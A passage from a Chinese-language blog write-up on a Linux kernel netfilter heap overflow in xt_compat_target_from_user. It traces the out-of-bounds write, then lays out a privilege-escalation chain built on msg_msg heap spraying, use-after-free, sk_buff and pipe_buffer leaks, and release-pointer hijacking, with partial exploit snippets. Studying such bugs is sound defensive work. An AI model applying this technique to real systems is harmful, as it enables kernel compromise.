<span class="built_in">memset</span>(info, <span class="number">0</span>, <span class="keyword">sizeof</span>(*info));</span><br><span class="line">	info-&gt;size = size;</span><br><span class="line">	<span class="keyword">return</span> info;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>可以看到使用<code>kvmalloc</code>，申请标志为<code>GFP_KERNEL_ACCOUNT</code>，并且<code>XT_MAX_TABLE_SIZE</code>定义如下，也就是在kmalloc-512到kmalloc-8192</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define XT_MAX_TABLE_SIZE	(512 * 1024 * 1024)</span><br></pre></td></tr></table></div></figure></li>
<li><p><code>pos/entry1</code>：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">entry1 = newinfo-&gt;entries;</span><br><span class="line">pos = entry1;</span><br></pre></td></tr></table></div></figure>

<p>即<code>pos/entry1</code>的值为<code>newinfo_addr+0x40(0x4*3+0x14+0x14+0x4+0x8)</code></p>
</li>
<li><p>调用如下函数进行下一步：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">compat_copy_entry_from_user(iter0, &amp;pos, &amp;size,</span><br><span class="line">					    newinfo, entry1);</span><br></pre></td></tr></table></div></figure></li>
</ul>
</li>
</ul>

        <h2 id="5-compat-copy-entry-from-user"   >
          <a href="#5-compat-copy-entry-from-user" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-compat-copy-entry-from-user" class="headerlink" title="5.compat_copy_entry_from_user()"></a>5.compat_copy_entry_from_user()</h2>
      <ul>
<li><p>参数：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(struct compat_ipt_entry *e, <span class="keyword">void</span> **dstptr,</span><br><span class="line">			    <span class="keyword">unsigned</span> <span class="keyword">int</span> *size,</span><br><span class="line">			    struct xt_table_info *newinfo, <span class="keyword">unsigned</span> <span class="keyword">char</span> *base)</span><br></pre></td></tr></table></div></figure></li>
<li><p>地址：不太清楚</p>
</li>
<li><p>介绍：</p>
<ul>
<li><p>主要关注变量：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//传入的</span></span><br><span class="line"><span class="comment">//即保存pos的栈地址，值为newinfo-&gt;entries(newinfo_addr+0x40)</span></span><br><span class="line"><span class="keyword">void</span> **dstptr;  </span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> *size;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xt_table_info</span> *<span class="title">newinfo</span>;</span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure></li>
<li><p>相关操作：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">compat_copy_entry_from_user(struct compat_ipt_entry *e, <span class="keyword">void</span> **dstptr,</span><br><span class="line">                            <span class="keyword">unsigned</span> <span class="keyword">int</span> *size,</span><br><span class="line">                            struct xt_table_info *newinfo, <span class="keyword">unsigned</span> <span class="keyword">char</span> *base)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">    <span class="comment">//即pos加上0x70，值为newinfo_addr+0x40+0x70</span></span><br><span class="line">    *dstptr += <span class="keyword">sizeof</span>(struct ipt_entry);</span><br><span class="line">    *size += <span class="keyword">sizeof</span>(struct ipt_entry) - <span class="keyword">sizeof</span>(struct compat_ipt_entry);</span><br><span class="line">    xt_ematch_foreach(ematch, e)</span><br><span class="line">		xt_compat_match_from_user(ematch, dstptr, size);</span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">    xt_compat_target_from_user(t, dstptr, size);</span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure></li>
</ul>
</li>
</ul>

        <h2 id="6-xt-compat-match-from-user"   >
          <a href="#6-xt-compat-match-from-user" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-xt-compat-match-from-user" class="headerlink" title="6.xt_compat_match_from_user()"></a>6.xt_compat_match_from_user()</h2>
      <p>这个函数和接下来的漏洞函数<code>xt_compat_target_from_user</code>可以说基本一致，观察下图即可看到，具体用来干什么不太清楚，但是作用也是相关的pad填充<code>newinfo</code>上的数据。打了一个循环<code>xt_ematch_foreach</code>，在我们关注的这个漏洞里，其作用就只是使得<code>*dstptr + n * msize</code>，也就是在我们关心的最终值为<code>newinfo_addr+0x40+0x70+n * msize</code>，从而使得在进入<code>xt_compat_target_from_user</code>之前，<code>*dstptr</code>上的堆块地址已经移动到末尾了。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/Img/image-20220507214923917.png" alt="image-20220507214923917" style="zoom: 80%;" />        <img src="https://pig-007.oss-cn-beijing.aliyuncs.com/Img/image-20220507214947982.png" alt="image-20220507214947982" style="zoom: 80%;" /></p>
<p>做了一个数据对比：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">newinfo：				0xffff888006a2a000</span><br><span class="line">t：						0xffff888006a2afda</span><br><span class="line">t-&gt;data：				0xffff888006a2affa</span><br><span class="line">target-&gt;targetsize：		0x4</span><br><span class="line">dstptr：</span><br><span class="line">	xt_compat_match_from_user的时候：</span><br><span class="line">		0xffffc900002b7ad0-&gt;0xffff888006a2a0b0</span><br><span class="line">	xt_compat_target_from_user的时候：</span><br><span class="line">		0xffffc900002b7ad0-&gt;0xffff888006a2afda</span><br></pre></td></tr></table></div></figure>

<p>也就是说经过<code>xt_compat_match_from_user</code>函数之后，保存在<code>*dstptr</code>上的漏洞堆的地址已经加上了<code>0xf2a</code>。</p>

        <h2 id="6-xt-compat-target-from-user"   >
          <a href="#6-xt-compat-target-from-user" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-xt-compat-target-from-user" class="headerlink" title="6.xt_compat_target_from_user()"></a>6.xt_compat_target_from_user()</h2>
      <p>终于来到最后的漏洞函数</p>
<ul>
<li><p>参数：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(struct xt_entry_target *t, <span class="keyword">void</span> **dstptr,</span><br><span class="line">				<span class="keyword">unsigned</span> <span class="keyword">int</span> *size)</span><br></pre></td></tr></table></div></figure></li>
<li><p>地址：<code>0xFFFFFFFF81A82F75</code></p>
</li>
<li><p>介绍：</p>
<ul>
<li><p>主要关注变量</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//传入的</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xt_entry_target</span> *<span class="title">t</span>;</span></span><br><span class="line"><span class="keyword">void</span> **dstptr;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> *size;</span><br><span class="line"></span><br><span class="line"><span class="comment">//自定义的</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">xt_target</span> *<span class="title">target</span> =</span> t-&gt;u.kernel.target;</span><br><span class="line"><span class="keyword">int</span> pad, off = xt_compat_target_offset(target);</span><br></pre></td></tr></table></div></figure></li>
<li><p>相关操作：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xt_compat_target_from_user</span><span class="params">(struct xt_entry_target *t, <span class="keyword">void</span> **dstptr,</span></span></span><br><span class="line"><span class="params"><span class="function">				<span class="keyword">unsigned</span> <span class="keyword">int</span> *size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">xt_target</span> *<span class="title">target</span> =</span> t-&gt;u.kernel.target;</span><br><span class="line">	<span class="keyword">int</span> pad, off = xt_compat_target_offset(target);</span><br><span class="line">	<span class="comment">//.....</span></span><br><span class="line">    <span class="comment">//即获取指针为newinfo+0x40+0x70+0xf2a</span></span><br><span class="line">	t = *dstptr;</span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">    <span class="comment">//进行8字节对齐</span></span><br><span class="line">	pad = XT_ALIGN(target-&gt;targetsize) - target-&gt;targetsize;</span><br><span class="line">	<span class="keyword">if</span> (pad &gt; <span class="number">0</span>)</span><br><span class="line">        <span class="comment">//target-&gt;targetsize为4，则最终传入的地址为</span></span><br><span class="line">        <span class="comment">//newinfo+0x40+0x70+0xf2a+0x20+0x4=newinfo+0xffe</span></span><br><span class="line">        <span class="comment">//同时pad在经过对齐之后也为4,那么就溢出2个字节</span></span><br><span class="line">		<span class="built_in">memset</span>(t-&gt;data + target-&gt;targetsize, <span class="number">0</span>, pad);</span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure></li>
</ul>
</li>
</ul>

        <h2 id="总结-1"   >
          <a href="#总结-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2>
      <p>通过上述分析可以看到，其实该漏洞的成因就是</p>

        <h3 id="1-控制堆块大小和偏移"   >
          <a href="#1-控制堆块大小和偏移" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-控制堆块大小和偏移" class="headerlink" title="(1)控制堆块大小和偏移"></a>(1)控制堆块大小和偏移</h3>
      <p>通过控制传入的<code>&amp;data</code>中的<code>pad</code>的大小来控制申请的堆块的大小和<code>t-&gt;data</code>的相对偏移地址</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">attribute__</span>((__<span class="title">packed__</span>)) &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ipt_replace</span> <span class="title">replace</span>;</span>         <span class="comment">// 0x60</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ipt_entry</span> <span class="title">entry</span>;</span>            <span class="comment">// 0x70</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">xt_entry_match</span> <span class="title">match</span>;</span>         <span class="comment">// 0x20</span></span><br><span class="line">  <span class="keyword">char</span> pad[<span class="number">0x108</span> + PRIMARY_SIZE - <span class="number">0x200</span> - <span class="number">0x2</span>];     </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">xt_entry_target</span> <span class="title">target</span>;</span>      <span class="comment">// 0x20</span></span><br><span class="line">&#125; data = &#123;<span class="number">0</span>&#125;;</span><br></pre></td></tr></table></div></figure>

<p>例子：</p>
<p>比如bsauce师傅提供的EXP中的pad如下，这里使用的是<code>kmalloc-4096</code>：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> pad[<span class="number">0x108</span> + PRIMARY_SIZE - <span class="number">0x200</span> - <span class="number">0x2</span>]; </span><br></pre></td></tr></table></div></figure>

<p>那么我们尝试使用<code>kmalloc-2048</code>，在代码中减去0x800得到如下：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> pad[<span class="number">0x108</span> + PRIMARY_SIZE - <span class="number">0x200</span> - <span class="number">0x2</span> - <span class="number">0x800</span>];</span><br></pre></td></tr></table></div></figure>

<p>断点打在<code>xt_alloc_table_info</code>，在第二次的<code>xt_alloc_table_info</code>申请漏洞堆块处，查看下CPU0的<code>kmalloc-2048</code>中<code>freelist</code>中的堆块。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220508200120767.png" alt="image-20220508200120767"></p>
<p>然后<code>finish</code>当前函数，查看rax申请到的堆块，即为<code>freelist</code>中的第一个堆块</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220508200155851.png" alt="image-20220508200155851"></p>
<p>可以看到是从CP0的<code>kmalloc-2048</code>中申请得到的，之后在<code>call memset</code>的漏洞点打下断点，按c继续运行，断下来</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220508200407354.png" alt="image-20220508200407354"></p>
<p>可以看到仍然还是该漏洞堆块，并且相关的地址也类似的，pad为0x4，所以还是存在漏洞点的。</p>
<p>不过具体的细节有点不太清楚，后续还得补一补<code>Netfilter</code>的相关知识。</p>

        <h3 id="2-控制填充pad"   >
          <a href="#2-控制填充pad" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-控制填充pad" class="headerlink" title="(2)控制填充pad"></a>(2)控制填充pad</h3>
      <p>通过控制传入的<code>data.target.u.user.revision</code>来控制<code>target-&gt;targetsize</code></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data.target.u.user.revision = <span class="number">1</span>;</span><br></pre></td></tr></table></div></figure>

<p>不同的<code>version</code>控制不同的<code>target-&gt;targetsize</code>。</p>
<p>这里经过我自己的实际调试，感觉bsauce师傅说的有点小问题。漏洞点应该是出在上述的<code>t-&gt;daii</code>地址没有0x8对齐的时候，并且<code>target-&gt;size</code>也没有0x8对齐的情况下。</p>
<p>此外，不应该只是2字节溢出，最多应该可以到达4字节溢出，如下设置</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> pad[<span class="number">0x108</span> + PRIMARY_SIZE - <span class="number">0x200</span> - <span class="number">0x2</span> + <span class="number">0x2</span>]; </span><br></pre></td></tr></table></div></figure>

<p>这样可以溢出4个字节写0，最终效果如下：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220508204003227.png" alt="image-20220508204003227"></p>
<p>如果再加pad的话就会导致申请出<code>kmalloc-8192</code>的堆块了</p>

        <h1 id="二、漏洞利用"   >
          <a href="#二、漏洞利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、漏洞利用" class="headerlink" title="二、漏洞利用"></a>二、漏洞利用</h1>
      
        <h2 id="1-溢出转化UAF"   >
          <a href="#1-溢出转化UAF" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-溢出转化UAF" class="headerlink" title="1.溢出转化UAF"></a>1.溢出转化UAF</h2>
      <p>这里涉及到之前提到的<code>msg_msg</code>结构体利用。</p>

        <h3 id="1-堆喷内存布局"   >
          <a href="#1-堆喷内存布局" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-堆喷内存布局" class="headerlink" title="(1)堆喷内存布局"></a>(1)堆喷内存布局</h3>
      <p>首先使用<code>msgget</code>申请多个消息队列，然后往每个消息队列发送两条消息，一条主消息<code>0x1000</code>，一条辅助消息<code>0x400</code>。这里发送消息时需要注意下，先遍历每个队列发送主消息，然后再遍历每个队列发送辅助消息。这样进行堆喷构造后，其中就会有部分的消息队列中的主消息连成一整块地址连续的内存，<strong>辅助消息也需要地址连成一整块，方便后续泄露地址，但是这里为了好看就没有连一起</strong>。比如这里申请三个消息队列，最终形成类似的如下布局</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513110107919.png" alt="image-20220513110107919"></p>
<p>当然这里每条<code>0x1000</code>的主消息中还有几个<code>struct msg_msgseg*</code>没有画出来</p>

        <h3 id="2-漏洞溢出构造UAF"   >
          <a href="#2-漏洞溢出构造UAF" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-漏洞溢出构造UAF" class="headerlink" title="(2)漏洞溢出构造UAF"></a>(2)漏洞溢出构造UAF</h3>
      <p>这里我们先释放例子中的第二条主消息，虽说在主消息中是由4个<code>kmalloc(0x400)</code>申请出来的4个堆块，但是如果都释放之后，内存的回收机制发现这四个地址连续且都被释放，那么就会归并成一页<code>page</code>还给<code>Slub</code>分配器，其实就是<code>kmalloc-4096</code>。（里面算法很复杂，不是很懂，后面再来理清楚。）之后再申请<code>0x1000</code>大小的堆块，就会优先从这里取。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513110346186.png" alt="image-20220513110346186"></p>
<p>然后我们使用漏洞，调用<code>socketopt</code>来申请一个<code>0x1000</code>的<code>xt_table_info</code>，就会占据到我们刚刚释放的<code>0x1000</code>大小的堆块上。(这个前面我们分析<code>socketopt</code>会申请两个<code>0x1000</code>大小的堆块，那么我们之后就是多释放几条主消息即可)这样在占据之后，发生2字节溢出写0，就可以溢出到下一个消息队列的<code>msg_msg</code>头部结构的<code>struct list_head m_list.next</code>指针，从而使得其指向其他位置，如果运气好的话，由于辅助消息也是堆喷形式，且大小为<code>0x400</code>，那么溢出两字节写0就可能将该<code>next</code>指针指向其他的辅助消息，从而造成两个消息队列中共存一个辅助消息。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513110927931.png" alt="image-20220513110927931"></p>
<p>比如图中消息队列3中的主消息头部的<code>struct list_head m_list.next</code>即被修改(黑色为溢出2字节写0)，如红色箭头所示指向了消息队列1中的辅助消息，这样消息队列1和消息队列3都指向了同一个辅助消息，构成了堆块<code>overlap</code>。之后我们释放消息队列1中的辅助消息，而消息队列3仍然指向该辅助消息，构成了UAF。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513111337456.png"></p>
<p>🔺注：在实际的利用里，需要进行堆喷布局，申请很多的消息队列，这时候就需要用<code>MSG_COPY</code>标志位来进行消息读取。利用此标志位读取消息但不释放堆块，然后借助发送消息时自己留下的索引标志来判断到底是哪个辅助消息被两个消息队列所包含，这样就能进行后续的利用。</p>

        <h2 id="2-利用UAF"   >
          <a href="#2-利用UAF" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-利用UAF" class="headerlink" title="2.利用UAF"></a>2.利用UAF</h2>
      
        <h3 id="1-泄露堆地址"   >
          <a href="#1-泄露堆地址" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-泄露堆地址" class="headerlink" title="(1)泄露堆地址"></a>(1)泄露堆地址</h3>
      <p>首先使用<code>sk_buff</code>的<code>data</code>数据块来占据该<code>UAF</code>堆块。前面提到<code>sk_buff</code>的结构头使用独有的缓冲池<code>kache</code>来申请，但是其<code>data</code>数据块还是使用<code>kmalloc</code>常规路线来申请释放(使用正常的发包收包即可完成申请释放)，并且<code>size</code>和<code>data</code>内容完全可控，这样我们就可以完全控制该<code>UAF</code>堆块。</p>
<p>之后伪造一个<code>fake_msg_msg</code>结构体，结构如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513112451162.png" alt="image-20220513112451162"></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /include/linux/msg.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span><span class="comment">//与msg_queue或者其他的msg_msg组成双向循环链表</span></span><br><span class="line">	<span class="keyword">long</span> m_type;</span><br><span class="line">	<span class="keyword">size_t</span> m_ts;		<span class="comment">/* message text size */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span><span class="comment">//单向链表，指向该条信息后面的msg_msgseg</span></span><br><span class="line">	<span class="keyword">void</span> *security;</span><br><span class="line">	<span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>改大其<code>m_ts</code>域，就可以读取出消息队列2的辅助消息头部指针<code>struct list_head m_list.next</code>的值，从而泄露消息队列2的<code>msg_msg_queue</code>的<code>struct list_head m_list</code>域的地址，为一个堆地址。</p>
<p>之后我们修改<code>fake_msg_msg</code>的<code>struct msg_msgseg *next</code>指针，指向上述获得的消息队列2的<code>struct list_head m_list</code>域的地址，就能读出该<code>struct list_head m_list</code>域的<code>prev</code>指针，即为消息队列2的辅助消息的地址，减去<code>0x400</code>即为<code>UAF</code>堆块的地址</p>

        <h3 id="2-泄露内核基地址"   >
          <a href="#2-泄露内核基地址" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-泄露内核基地址" class="headerlink" title="(2)泄露内核基地址"></a>(2)泄露内核基地址</h3>
      <p>接下来利用到<code>pipe</code>管道，主要是其中<code>struct pipe_inode_info</code>的<code>struct pipe_buffer *bufs;</code>数组，总大小为<code>0x280</code>，使用<code>kmalloc-1024</code>，满足当前的<code>UAF</code>（同样使用正常的<code>read/write</code>即可完成申请释放）。其结构为</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11.14 /include/linux/pipe_fs_i.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> offset, len;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>利用如下操作读取<code>const struct pipe_buf_operations *ops;</code>指针，即可泄露内核基地址</p>
<ul>
<li>利用 <code>sk_buff</code> 修复<code>UAF</code>处的辅助消息，之后从消息队列中接收该辅助消息，此时该<code>UAF</code>对象重回 <code>slub</code>的<code>kmalloc-1024</code>的<code>freelist</code>中，但 <code>sk_buff</code> 仍指向该<code>UAF</code>对象</li>
<li>喷射 <code>pipe_buffer</code>，就会将该<code>UAF</code>对象申请回来，将<code>pipe_buffer</code>写入到该<code>UAF</code>对象上，之后再接收 <code>sk_buff</code> 数据包，即可获取<code>pipe_buffer</code>上的数据，得到<code>const struct pipe_buf_operations *ops;</code>指针，即可泄露内核基地址</li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513115154194.png" alt="image-20220513115154194"></p>

        <h3 id="3-劫持程序执行流"   >
          <a href="#3-劫持程序执行流" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-劫持程序执行流" class="headerlink" title="(3)劫持程序执行流"></a>(3)劫持程序执行流</h3>
      <p>之前也提到过，当我们关闭管道<code>pipe</code>两端或者从管道<code>pipe</code>中读取出所有数据之后，会调用到<code>pipe_buf_release()</code>函数进行清理，其中会调用<code>struct pipe_buffer *bufs;</code>下的<code>const struct pipe_buf_operations *ops;</code>对应函数表中的<code>release</code>函数指针。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">pipe_buf_release</span><span class="params">(struct pipe_inode_info *pipe,</span></span></span><br><span class="line"><span class="params"><span class="function">				    struct pipe_buffer *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span> =</span> buf-&gt;ops;</span><br><span class="line"></span><br><span class="line">	buf-&gt;ops = <span class="literal">NULL</span>;</span><br><span class="line">	ops-&gt;release(pipe, buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>现在我们就可以通过<code>sk_buff</code>来劫持劫持<code>ops</code>指针函数表，修改其中的<code>release</code>函数指针，完成劫持程序流。并且此时的<code>rsi</code>即为<code>buf</code>为我们的<code>UAF</code>对象，而<code>sk_buff</code>又可以使得<code>UAF</code>对象里的数据完全可控。如果找到一个可以将<code>rsp</code>劫持为<code>rsi</code>的<code>gadget</code>，那么就可以完全操控程序流程了。</p>

        <h2 id="3-EXP解析"   >
          <a href="#3-EXP解析" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-EXP解析" class="headerlink" title="3.EXP解析"></a>3.EXP解析</h2>
      <p>这个其实也没有什么好讲的，看懂漏洞利用过程其实也很容易写出来的，主要提一下某些比较偏的知识点，也防止忘记。</p>

        <h3 id="1-绑定CPU分配"   >
          <a href="#1-绑定CPU分配" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-绑定CPU分配" class="headerlink" title="(1)绑定CPU分配"></a>(1)绑定CPU分配</h3>
      <p>通常是用来进行堆块分配时查看堆块内存的，防止堆块申请的时候东一个西一个的，方便调试，同时也是为了提高堆喷射的稳定性</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//bind the cpu0</span></span><br><span class="line"><span class="keyword">cpu_set_t</span> <span class="built_in">set</span>;</span><br><span class="line">CPU_ZERO(&amp;<span class="built_in">set</span>);</span><br><span class="line">CPU_SET(<span class="number">0</span>, &amp;<span class="built_in">set</span>);</span><br><span class="line"><span class="keyword">if</span> (sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(<span class="built_in">set</span>), &amp;<span class="built_in">set</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] sched_setaffinity&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-命名空间"   >
          <a href="#2-命名空间" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-命名空间" class="headerlink" title="(2)命名空间"></a>(2)命名空间</h3>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">setup_sandbox</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (unshare(CLONE_NEWUSER) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] unshare(CLONE_NEWUSER)&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (unshare(CLONE_NEWNET) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] unshare(CLONE_NEWNET)&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p><code>EXP</code>原作者称：当<code>IPT_SO_SET_REPLACE</code>或<code>IP6T_SO_SET_REPLACE</code>在兼容模式下被调用时（需要<code>CAP_NET_ADMIN</code>权限）。</p>
<p>这个在源代码<code>do_ipt_set_ctl()</code>函数中有所体现</p>
